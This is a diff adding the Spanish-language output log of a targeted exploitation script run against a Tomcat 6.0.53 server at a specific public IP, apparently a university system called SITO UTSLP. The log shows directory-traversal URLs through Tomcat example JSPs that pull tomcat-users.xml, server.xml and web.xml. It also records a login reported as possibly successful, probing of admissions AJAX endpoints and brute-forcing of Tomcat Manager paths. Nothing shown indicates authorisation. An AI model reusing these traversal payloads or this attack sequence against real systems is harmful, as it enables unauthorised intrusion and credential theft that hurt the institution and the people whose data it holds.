@@ -1,0 +1,72 @@
+Script de Explotación Dirigida para Tomcat 6.0.53:
+============================================================
+EXPLOTACIÓN TOMCAT 6.0.53 - SITO UTSLP
+============================================================
+[+] Probando conectividad...
+  ✅ http://189.254.143.102 - Status: 200
+  ✅ https://189.254.143.102 - Status: 200
+
+[+] Explotando Directory Traversal...
+
+🔍 Buscando: tomcat-users.xml
+  ✅ ENCONTRADO: http://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml
+  💾 Guardado como: extracted_tomcat-users.xml
+  ❌ Error analizando XML: mismatched tag: line 94, column 2
+  ✅ ENCONTRADO: http://189.254.143.102/examples/jsp/cal/cal2.jsp?time=../../../../conf/tomcat-users.xml
+  💾 Guardado como: extracted_tomcat-users.xml
+  ❌ Error analizando XML: not well-formed (invalid token): line 29, column 11
+  ✅ ENCONTRADO: http://189.254.143.102/examples/jsp/snp/snoop.jsp?page=../../../../conf/tomcat-users.xml
+  💾 Guardado como: extracted_tomcat-users.xml
+  ❌ Error analizando XML: mismatched tag: line 55, column 2
+
+🔍 Buscando: server.xml
+  ✅ ENCONTRADO: http://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../conf/server.xml
+  💾 Guardado como: extracted_server.xml
+  ❌ Error analizando XML: mismatched tag: line 94, column 2
+  ✅ ENCONTRADO: http://189.254.143.102/examples/jsp/cal/cal2.jsp?time=../../../../conf/server.xml
+  💾 Guardado como: extracted_server.xml
+  ❌ Error analizando XML: not well-formed (invalid token): line 29, column 11
+
+🔍 Buscando: web.xml
+  ✅ ENCONTRADO: http://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../webapps/manager/WEB-INF/web.xml
+  💾 Guardado como: extracted_web.xml
+  ❌ Error analizando XML: mismatched tag: line 94, column 2
+  ✅ ENCONTRADO: http://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../WEB-INF/web.xml
+  💾 Guardado como: extracted_web.xml
+  ❌ Error analizando XML: mismatched tag: line 94, column 2
+
+[+] Explotando credenciales SITO...
+  🔄 Probando login en: http://189.254.143.102/jsp/index.jsp
+  ✅ POSIBLE LOGIN EXITOSO!
+
+[+] Explorando área autenticada...
+
+[+] Explotando endpoints AJAX...
+
+🔍 Probando: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp
+  ✅ Normal: 200 - Tamaño: 29
+    📄 Respuesta: 
+
+
+1¬INSTITUTO OCTAVIO PAZ...
+
+🔍 Probando: /jsp/escolar/muestra_bachillerato_ajax.jsp
+  ✅ Normal: 200 - Tamaño: 29
+    📄 Respuesta: 
+
+
+1,INSTITUTO OCTAVIO PAZ...
+
+[+] Fuerza bruta Tomcat Manager...
+
+🔐 Probando: /manager/html
+
+🔐 Probando: /manager/status
+
+🔐 Probando: /manager/jmxproxy
+
+============================================================
+EXPLOTACIÓN COMPLETADA
+============================================================
+
+
